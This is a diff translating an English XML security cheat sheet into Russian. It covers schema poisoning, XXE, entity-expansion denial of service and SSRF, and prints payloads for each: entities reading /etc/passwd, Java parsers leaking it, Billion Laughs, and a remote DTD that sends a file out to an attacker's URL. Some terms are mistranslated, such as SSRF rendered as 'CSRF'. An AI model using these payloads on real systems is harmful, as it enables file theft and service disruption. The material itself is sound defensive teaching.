-**When an attacker is capable of introducing modifications to a schema, there could be multiple high-risk consequences. In particular, the effect of these consequences will be more dangerous if the schemas are using [DTD](https://www.w3schools.com/xml/xml_dtd_intro.asp) (e.g., file retrieval, denial of service).** An attacker could exploit this type of vulnerability in numerous scenarios, always depending on the location of the schema.
+**Когда злоумышленник способен внести изменения в схему, это может привести к многочисленным последствиям с высокой степенью риска. В частности, последствия будут более опасными, если в схемах используется [DTD](https://www.w3schools.com/xml/xml_dtd_intro.asp) (например, поиск файлов, отказ в обслуживании).** Злоумышленник может воспользоваться этим типом уязвимости в различных сценариях, всегда в зависимости от расположения схемы.
 
-#### Local Schema Poisoning
+#### Заражение локальной схемы
 
-**Local schema poisoning happens when schemas are available in the same host, whether or not the schemas are embedded in the same XML document.**
+**Заражение локальной схемы происходит, когда схемы доступны на одном и том же хосте, независимо от того, встроены они в один и тот же XML-документ или нет.**
 
-##### Embedded Schema
+##### Встроенная схема
 
-**The most trivial type of schema poisoning takes place when the schema is defined within the same XML document.** Consider the following, unknowingly vulnerable example provided by the W3C :
+**Наиболее тривиальный тип заражения схемы происходит, когда схема определена в одном и том же XML-документе.** Рассмотрим следующий неосознанно уязвимый пример, предоставленный W3C :
 
 ```xml
 <?xml version="1.0"?>
@@ -409,11 +408,11 @@ In most cases, the overall result will be a huge document. This is a short examp
 </note>
 ```
 
-All restrictions on the note element could be removed or altered, allowing the sending of any type of data to the server. Furthermore, if the server is processing external entities, the attacker could use the schema, for example, to read remote files from the server. **This type of schema only serves as a suggestion for sending a document, but it must contain a way to check the embedded schema integrity to be used safely. Attacks through embedded schemas are commonly used to exploit external entity expansions. Embedded XML schemas can also assist in port scans of internal hosts or brute force attacks.**
+Все ограничения на элемент note могут быть сняты или изменены, что позволит отправлять на сервер данные любого типа. Кроме того, если сервер обрабатывает внешние объекты, злоумышленник может использовать схему, например, для чтения удаленных файлов с сервера. **Этот тип схемы служит только рекомендацией для отправки документа, но для безопасного использования он должен содержать способ проверки целостности встроенной схемы. Атаки с использованием встроенных схем обычно используются для использования расширений внешних объектов. Встроенные XML-схемы также могут помочь в сканировании портов внутренних хостов или атаках методом перебора.**
 
-##### Incorrect Permissions
+##### Неправильные разрешения
 
-**You can often circumvent the risk of using remotely tampered versions by processing a local schema.**
+**Часто можно избежать риска использования удаленно подделанных версий, обработав локальную схему.**
 
 ```xml
 <!DOCTYPE note SYSTEM "note.dtd">
@@ -425,21 +424,21 @@ All restrictions on the note element could be removed or altered, allowing the s
 </note>
 ```
 
-**However, if the local schema does not contain the correct permissions, an internal attacker could alter the original restrictions.** The following line exemplifies a schema using permissions that allow any user to make modifications:
+**Однако, если локальная схема не содержит правильных разрешений, внутренний злоумышленник может изменить исходные ограничения.** В следующей строке приведен пример схемы, использующей разрешения, которые позволяют любому пользователю вносить изменения:
 
 ```text
 -rw-rw-rw-  1 user  staff  743 Jan 15 12:32 note.dtd
 ```
 
-The permissions set on `name.dtd` allow any user on the system to make modifications. This vulnerability is clearly not related to the structure of an XML or a schema, but since these documents are commonly stored in the filesystem, it is worth mentioning that an attacker could exploit this type of problem.
+Разрешения, установленные для файла `name.dtd`, позволяют любому пользователю системы вносить изменения. Очевидно, что эта уязвимость не связана со структурой XML или схемой, но поскольку эти документы обычно хранятся в файловой системе, стоит отметить, что злоумышленник может воспользоваться этим типом проблемы.
 
-#### Remote Schema Poisoning
+#### Заражение удаленной схемы
 
-**Schemas defined by external organizations are normally referenced remotely. If capable of diverting or accessing the network's traffic, an attacker could cause a victim to fetch a distinct type of content rather than the one originally intended.**
+**Схемы, определенные внешними организациями, обычно используются удаленно. Если злоумышленник может перенаправить сетевой трафик или получить к нему доступ, он может заставить жертву получать контент другого типа, а не тот, который изначально предназначался.**
 
-##### Man-in-the-Middle (MitM) Attack
+##### Атака "Человек посередине" (MitM)
 
-When documents reference remote schemas using the unencrypted Hypertext Transfer Protocol (HTTP), the communication is performed in plain text and an attacker could easily tamper with traffic. **When XML documents reference remote schemas using an HTTP connection, the connection could be sniffed and modified before reaching the end user:**
+Когда документы ссылаются на удаленные схемы, использующие незашифрованный протокол передачи гипертекста (HTTP), обмен данными осуществляется в виде обычного текста, и злоумышленник может легко повлиять на трафик. **Когда XML-документы ссылаются на удаленные схемы, использующие HTTP-соединение, это соединение может быть перехвачено и изменено до того, как оно дойдет до конечного пользователя:**
 
 ```xml
 <!DOCTYPE note SYSTEM "http://example.com/note.dtd">
@@ -451,43 +450,42 @@ When documents reference remote schemas using the unencrypted Hypertext Transfer
 </note>
 ```
 
-The remote file `note.dtd` could be susceptible to tampering when transmitted using the unencrypted HTTP protocol. One tool available to facilitate this type of attack is mitmproxy .
+Удаленный файл `note.dtd` может быть подвержен несанкционированному доступу при передаче по незашифрованному протоколу HTTP. Одним из доступных инструментов для проведения такого рода атак является mitmproxy .
 
-##### DNS-Cache Poisoning
+##### Заражение DNS-кэша
 
-Remote schema poisoning may also be possible even when using encrypted protocols like Hypertext Transfer Protocol Secure (HTTPS). **When software performs reverse Domain Name System (DNS) resolution on an IP address to obtain the hostname, it may not properly ensure that the IP address is truly associated with the hostname.** In this case, the software enables an attacker to redirect content to their own Internet Protocol (IP) addresses.
-
+Удаленное заражение схемы также может быть возможным даже при использовании зашифрованных протоколов, таких как защищенный протокол передачи гипертекста (HTTPS). **Когда программное обеспечение выполняет обратное разрешение системы доменных имен (DNS) для IP-адреса для получения имени хоста, это может не гарантировать, что IP-адрес действительно связан с именем хоста.** В этом случае программное обеспечение позволяет злоумышленнику перенаправлять контент на свои собственные адреса интернет-протокола (IP).
 The previous example referenced the host `example.com` using an unencrypted protocol.
 
-When switching to HTTPS, the location of the remote schema will look like `https://example/note.dtd`. In a normal scenario, the IP of `example.com` resolves to `1.1.1.1`:
+При переключении на HTTPS местоположение удаленной схемы будет выглядеть как `https://example/note.dtd`. В обычном сценарии IP-адрес `example.com` преобразуется в `1.1.1.1`:
 
 ```bash
 $ host example.com
 example.com has address 1.1.1.1
 ```
 
-If an attacker compromises the DNS being used, the previous hostname could now point to a new, different IP controlled by the attacker `2.2.2.2`:
+Если злоумышленник скомпрометирует используемый DNS, предыдущее имя хоста теперь может указывать на новый, другой IP-адрес, контролируемый злоумышленником `2.2.2.2`:
 
 ```bash
 $ host example.com
 example.com has address 2.2.2.2
 ```
 
-When accessing the remote file, the victim may be actually retrieving the contents of a location controlled by an attacker.
+Получая доступ к удаленному файлу, жертва может фактически извлекать содержимое хранилища, контролируемого злоумышленником.
 
-##### Evil Employee Attack
+##### Нападение злого сотрудника
 
-When third parties host and define schemas, the contents are not under the control of the schemas' users. **Any modifications introduced by a malicious employee-or an external attacker in control of these files-could impact all users processing the schemas. Subsequently, attackers could affect the confidentiality, integrity, or availability of other services (especially if the schema in use is [DTD](https://www.w3schools.com/xml/xml_dtd_intro.asp)).**
+Когда схемы размещаются и определяются третьими сторонами, их содержимое не контролируется пользователями схем. **Любые изменения, внесенные сотрудником-злоумышленником или внешним злоумышленником, контролирующим эти файлы, могут повлиять на всех пользователей, обрабатывающих схемы. Впоследствии злоумышленники могут повлиять на конфиденциальность, целостность или доступность других сервисов (особенно если используется схема [DTD](https://www.w3schools.com/xml/xml_dtd_intro.asp)).**
 
-### XML Entity Expansion
+### Расширение XML-объекта
 
-**If the parser uses a [DTD](https://www.w3schools.com/xml/xml_dtd_intro.asp), an attacker might inject data that may adversely affect the XML parser during document processing. These adverse effects could include the parser crashing or accessing local files.
+**Если синтаксический анализатор использует [DTD](https://www.w3schools.com/xml/xml_dtd_intro.asp), злоумышленник может ввести данные, которые могут негативно повлиять на анализатор XML во время обработки документа. Эти негативные последствия могут включать сбой анализатора или доступ к локальным файлам.
 
-#### Sample Vulnerable Java Implementations
+#### Примеры уязвимых реализаций Java
 
-**Using the [DTD](https://www.w3schools.com/xml/xml_dtd_intro.asp) capabilities of referencing local or remote files it is possible to affect file confidentiality.** In addition, it is also possible to affect the availability of the resources if no proper restrictions have been set for the entities expansion. Consider the following example code of an XXE.
+**Используя возможности [DTD](https://www.w3schools.com/xml/xml_dtd_intro.asp) для обращения к локальным или удаленным файлам, можно повлиять на конфиденциальность файлов.** Кроме того, также возможно повлиять на доступность ресурсов, если не были установлены надлежащие ограничения для расширения сущностей. Рассмотрим следующий пример кода XXE.
 
-**Sample XML**:
+**Пример XML**:
 
 ```xml
 <!DOCTYPE contacts SYSTEM "contacts.dtd">
@@ -499,7 +497,7 @@ When third parties host and define schemas, the contents are not under the contr
 </contacts>
 ```
 
-**Sample DTD**:
+**Пример DTD**:
 
 ```xml
 <!ELEMENT contacts (contact*)>
@@ -509,7 +507,7 @@ When third parties host and define schemas, the contents are not under the contr
 <!ENTITY xxe SYSTEM "/etc/passwd">
 ```
 
-##### XXE using DOM
+##### XXE используя DOM
 
 ```java
 import java.io.IOException;
@@ -550,7 +548,7 @@ public class parseDocument {
 }
 ```
 
-The previous code produces the following output:
+Предыдущий код выдает следующий результат:
 
 ```bash
 $ javac parseDocument.java ; java parseDocument
@@ -561,7 +559,7 @@ nobody:*:-2:-2:Unprivileged User:/var/empty:/usr/bin/false
 root:*:0:0:System Administrator:/var/root:/bin/sh
 ```
 
-##### XXE using DOM4J
+##### XXE используя DOM4J
 
 ```java
 import org.dom4j.Document;
@@ -590,7 +588,7 @@ public class test1 {
 }
 ```
 
-The previous code produces the following output:
+Предыдущий код выдает следующий результат:
 
 ```bash
 $ java test1
@@ -606,7 +604,7 @@ nobody:*:-2:-2:Unprivileged User:/var/empty:/usr/bin/false
 root:*:0:0:System Administrator:/var/root:/bin/sh
 ```
 
-##### XXE using SAX
+##### XXE используя SAX
 
 ```java
 import java.io.IOException;
@@ -636,7 +634,7 @@ public class parseDocument extends DefaultHandler {
 }
 ```
 
-The previous code produces the following output:
+Предыдущий код выдает следующий результат:
 
 ```bash
 $ java parseDocument
@@ -647,7 +645,7 @@ nobody:*:-2:-2:Unprivileged User:/var/empty:/usr/bin/false
 root:*:0:0:System Administrator:/var/root:/bin/sh
 ```
 
-##### XXE using StAX
+##### XXE используя StAX
 
 ```java
 import javax.xml.parsers.SAXParserFactory;
@@ -681,7 +679,7 @@ public class parseDocument {
 
 ```
 
-The previous code produces the following output:
+Предыдущий код выдает следующий результат:
 
 ```bash
 $ java parseDocument
@@ -691,9 +689,9 @@ nobody:*:-2:-2:Unprivileged User:/var/empty:/usr/bin/false
 root:*:0:0:System Administrator:/var/root:/bin/sh
 ```
 
-#### Recursive Entity Reference
+#### Рекурсивная ссылка на объект
 
-**When the definition of an element `A` is another element `B`, and that element `B` is defined as element `A`, that schema describes a circular reference between elements:**
+**Когда определение элемента `A` является другим элементом `B`, и этот элемент `B` определен как элемент `A`, эта схема описывает циклическую ссылку между элементами:**
 
 ```xml
 <!DOCTYPE A [
@@ -704,11 +702,11 @@ root:*:0:0:System Administrator:/var/root:/bin/sh
 <A>&A;</A>
 ```
 
-#### Quadratic Blowup
+#### Квадратичное увеличение
 
-**Instead of defining multiple small, deeply nested entities, the attacker in this scenario defines one very large entity and refers to it as many times as possible, resulting in a quadratic expansion (*O(n^2)*).**
+**Вместо определения множества небольших, глубоко вложенных объектов злоумышленник в этом сценарии определяет один очень большой объект и обращается к нему столько раз, сколько возможно, что приводит к квадратичному расширению (*O(n ^ 2)*).**
 
-The result of the following attack will be 100,000 x 100,000 characters in memory.
+Результатом следующей атаки будет 100 000 x 100 000 символов в памяти.
 
 ```xml
 <!DOCTYPE root [
@@ -718,9 +716,9 @@ The result of the following attack will be 100,000 x 100,000 characters in memor
 <root>&A;&A;&A;&A;...(a 100.000 &A;'s)...&A;&A;&A;&A;&A;</root>
 ```
 
-#### Billion Laughs
+#### Миллиард смешков (Billion Laughs)
 
-**When an XML parser tries to resolve the external entities included within the following code, it will cause the application to start consuming all of the available memory until the process crashes.** This is an example XML document with an embedded [DTD](https://www.w3schools.com/xml/xml_dtd_intro.asp) schema including the attack:
+**Когда синтаксический анализатор XML попытается разрешить внешние объекты, включенные в приведенный ниже код, это приведет к тому, что приложение начнет использовать всю доступную память, пока процесс не завершится сбоем.** Это пример XML-документа со встроенной схемой [DTD](https://www.w3schools.com/xml/xml_dtd_intro.asp), включающей атаку:
 
 ```xml
 <!DOCTYPE root [
@@ -739,11 +737,11 @@ The result of the following attack will be 100,000 x 100,000 characters in memor
 <root>&LOL9;</root>
 ```
 
-The entity `LOL9` will be resolved as the 10 entities defined in `LOL8`; then each of these entities will be resolved in `LOL7` and so on. Finally, the CPU and/or memory will be affected by parsing the `3 x 10^9` (3,000,000,000) entities defined in this schema, which could make the parser crash.
+Сущность `LOL9` будет разрешена как 10 сущностей, определенных в `LOL8`; затем каждая из этих сущностей будет разрешена в `LOL7` и так далее. Наконец, разбор объектов `3 x 10^ 9` (3 000 000 000), определенных в этой схеме, повлияет на работу процессора и/или памяти, что может привести к сбою синтаксического анализатора.
 
-**The Simple Object Access Protocol ([SOAP](https://en.wikipedia.org/wiki/SOAP)) specification forbids [DTD](https://www.w3schools.com/xml/xml_dtd_intro.asp)s completely. This means that a SOAP processor can reject any SOAP message that contains a [DTD](https://www.w3schools.com/xml/xml_dtd_intro.asp). Despite this specification, certain SOAP implementations did parse [DTD](https://www.w3schools.com/xml/xml_dtd_intro.asp) schemas within SOAP messages.**
+**Спецификация протокола простого доступа к объектам ([SOAP](https://en.wikipedia.org/wiki/SOAP)) полностью запрещает [DTD](https://www.w3schools.com/xml/xml_dtd_intro.asp). Это означает, что обработчик SOAP может отклонить любое сообщение SOAP, содержащее [DTD](https://www.w3schools.com/xml/xml_dtd_intro.asp). Несмотря на эту спецификацию, некоторые реализации SOAP анализировали схемы [DTD](https://www.w3schools.com/xml/xml_dtd_intro.asp) в сообщениях SOAP.**
 
-The following example illustrates a case where the parser is not following the specification, enabling a reference to a [DTD](https://www.w3schools.com/xml/xml_dtd_intro.asp) in a SOAP message:
+Следующий пример иллюстрирует случай, когда синтаксический анализатор не следует спецификации, позволяя использовать ссылку на [DTD](https://www.w3schools.com/xml/xml_dtd_intro.asp) в сообщении SOAP:
 
 ```xml
 <?XML VERSION="1.0" ENCODING="UTF-8"?>
@@ -769,9 +767,9 @@ The following example illustrates a case where the parser is not following the s
 </SOAP:ENVELOPE>
 ```
 
-#### Reflected File Retrieval
+#### Поиск отраженного файла
 
-Consider the following example code of an XXE:
+Рассмотрим следующий пример кода XXE:
 
 ```xml
 <?xml version="1.0" encoding="ISO-8859-1"?>
@@ -782,23 +780,23 @@ Consider the following example code of an XXE:
 <root>&xxe;</root>
 ```
 
-**The previous XML defines an entity named `xxe`, which is in fact the contents of `/etc/passwd`, which will be expanded within the `includeme` tag. If the parser allows references to external entities, it might include the contents of that file in the XML response or in the error output.**
+**Предыдущий XML-файл определяет объект с именем `xxe`, который на самом деле является содержимым файла `/etc/passwd`, который будет расширен в теге `includeme`. Если синтаксический анализатор допускает ссылки на внешние объекты, он может включить содержимое этого файла в XML-ответ или в вывод ошибки.**
 
-#### Server Side Request Forgery
+#### Подделка запроса на стороне сервера (SSRF)
 
-**Server Side Request Forgery (SSRF) happens when the server receives a malicious XML schema, which makes the server retrieve remote resources such as a file via HTTP/HTTPS/FTP, etc.** SSRF has been used to retrieve remote files, to prove a XXE when you cannot reflect back the file or perform port scanning, or perform brute force attacks on internal networks.
+**Подделка запросов на стороне сервера (CSRF) происходит, когда сервер получает вредоносную XML-схему, которая заставляет сервер извлекать удаленные ресурсы, такие как файл, через HTTP/HTTPS/FTP и т.д.** SRF используется для извлечения удаленных файлов, чтобы подтвердить исполняемый файл, когда вы не можете вернуть файл обратно или выполнять сканирование портов, или проводить атаки методом перебора во внутренних сетях.
 
-##### External DNS Resolution
+##### Разрешение внешнего DNS
 
-**Sometimes it is possible to induce the application to perform server-side DNS lookups of arbitrary domain names.** This is one of the simplest forms of SSRF, but requires the attacker to analyze the DNS traffic. Burp has a plugin that checks for this attack.
+**Иногда удается заставить приложение выполнить поиск DNS-данных по произвольным доменным именам на стороне сервера.** Это одна из простейших форм SSRF, но требует от злоумышленника анализа DNS-трафика. В Burp есть плагин, который проверяет наличие этой атаки.
 
 ```xml
 <!DOCTYPE m PUBLIC "-//B/A/EN" "http://checkforthisspecificdomain.example.com">
 ```
 
-##### External Connection
+##### Внешнее подключение
 
-Whenever there is an XXE and you cannot retrieve a file, you can test if you would be able to establish remote connections:
+Всякий раз, когда возникает ошибка XXE и вы не можете получить файл, вы можете проверить, сможете ли вы установить удаленные подключения:
 
 ```xml
 <?xml version="1.0" encoding="UTF-8"?>
@@ -808,9 +806,9 @@ Whenever there is an XXE and you cannot retrieve a file, you can test if you wou
 ]>
 ```
 
-##### File Retrieval with Parameter Entities
+##### Извлечение файлов с помощью объектов-параметров
 
-Parameter entities allows for the retrieval of content using URL references. Consider the following malicious XML document:
+Параметр entities позволяет извлекать содержимое с помощью URL-ссылок. Рассмотрим следующий вредоносный XML-документ:
 
 ```xml
 <?xml version="1.0" encoding="utf-8"?>
@@ -822,23 +820,23 @@ Parameter entities allows for the retrieval of content using URL references. Con
 <root>&send;</root>
 ```
 
-Here the [DTD](https://www.w3schools.com/xml/xml_dtd_intro.asp) defines two external parameter entities: `file` loads a local file, and `dtd` which loads a remote [DTD](https://www.w3schools.com/xml/xml_dtd_intro.asp). The remote [DTD](https://www.w3schools.com/xml/xml_dtd_intro.asp) should contain something like this:
-
+Здесь [DTD](https://www.w3schools.com/xml/xml_dtd_intro.asp) определяет два внешних параметра: `file` загружает локальный файл и `dtd`, который загружает удаленный [DTD](https://www.w3schools.com/xml/xml_dtd_intro.asp). Удаленный [DTD](https://www.w3schools.com/xml/xml_dtd_intro.asp) должен содержать что-то вроде этого:
+ 
 ```xml
 <?xml version="1.0" encoding="UTF-8"?>
 <!ENTITY % all "<!ENTITY send SYSTEM 'http://example.com/?%file;'>">
 %all;
 ```
 
-The second [DTD](https://www.w3schools.com/xml/xml_dtd_intro.asp) causes the system to send the contents of the `file` back to the attacker's server as a parameter of the URL.
+Второй [DTD](https://www.w3schools.com/xml/xml_dtd_intro.asp) заставляет систему отправлять содержимое "файла" обратно на сервер злоумышленника в качестве параметра URL-адреса.
 
-##### Port Scanning
+##### Сканирование портов
 
-The amount and type of information generated by port scanning will depend on the type of implementation. Responses can be classified as follows, ranking from easy to complex:
+Объем и тип информации, генерируемой при сканировании портов, будут зависеть от типа реализации. Ответы могут быть классифицированы следующим образом, от простых до сложных:
 
-**1) Complete Disclosure**: This is the simplest and most unusual scenario, with complete disclosure you can clearly see what's going on by receiving the complete responses from the server being queried. You have an exact representation of what happened when connecting to the remote host.
+**1) Полное раскрытие информации**: Это самый простой и необычный сценарий, при полном раскрытии информации вы можете четко видеть, что происходит, получая полные ответы от запрашиваемого сервера. У вас есть точное представление о том, что произошло при подключении к удаленному хосту.
 
-**2) Error-based**: If you are unable to see the response from the remote server, you may be able to use the information generated by the error response. Consider a web service leaking details on what went wrong in the SOAP Fault element when trying to establish a connection:
+**2) На основе ошибок**: Если вы не можете увидеть ответ от удаленного сервера, возможно, вы сможете использовать информацию, полученную в результате ответа об ошибке. Представьте, что веб-служба выдает сведения о том, что пошло не так в элементе SOAP Fault при попытке установить соединение:
 
 ```text
 java.io.IOException: Server returned HTTP response code: 401 for URL: http://192.168.1.1:80
@@ -846,13 +844,13 @@ java.io.IOException: Server returned HTTP response code: 401 for URL: http://192
  at com.sun.org.apache.xerces.internal.impl.XMLEntityManager.setupCurrentEntity(XMLEntityManager.java:674)
 ```
 
-**3) Timeout-based**: The scanner could generate timeouts when it connects to open or closed ports depending on the schema and the underlying implementation. If the timeouts occur while you are trying to connect to a closed port (which may take one minute), the time of response when connected to a valid port will be very quick (one second, for example). The differences between open and closed ports becomes quite clear.
+**3) На основе тайм-аута**: Сканер может генерировать тайм-ауты при подключении к открытым или закрытым портам в зависимости от схемы и базовой реализации. Если при попытке подключиться к закрытому порту возникают задержки (которые могут занять одну минуту), то при подключении к действительному порту время ответа будет очень коротким (например, одна секунда). Различия между открытыми и закрытыми портами становятся совершенно очевидными.
 
-**4) Time-based**: Sometimes it may be difficult to tell the differences between closed and open ports because the results are very subtle. The only way to know the status of a port with certainty would be to take multiple measurements of the time required to reach each host, then you should analyze the average time for each port to determinate the status of each port. This type of attack will be difficult to accomplish if it is performed in higher latency networks.
+**4) Привязка ко времени**: Иногда бывает трудно определить разницу между закрытыми и открытыми портами, поскольку результаты очень малозаметны. Единственный способ с уверенностью узнать статус порта - это провести несколько измерений времени, необходимого для достижения каждого хоста, затем вы должны проанализировать среднее время для каждого порта, чтобы определить статус каждого порта. Этот тип атаки будет трудно осуществить, если она будет осуществляться в сетях с более высокой задержкой.
 
-##### Brute Forcing
+##### Брутфорсинг
 
-**Once an attacker confirms that it is possible to perform a port scan, performing a brute force attack is a matter of embedding the `username` and `password` as part of the URI scheme (http, ftp, etc).** For example, see the following example:
+**Как только злоумышленник подтвердит, что можно выполнить сканирование порта, для осуществления атаки методом перебора необходимо ввести "имя пользователя" и "пароль" как часть схемы URI (http, ftp и т.д.).** Например, смотрите следующий пример:
 
 ```xml
 <!DOCTYPE root [
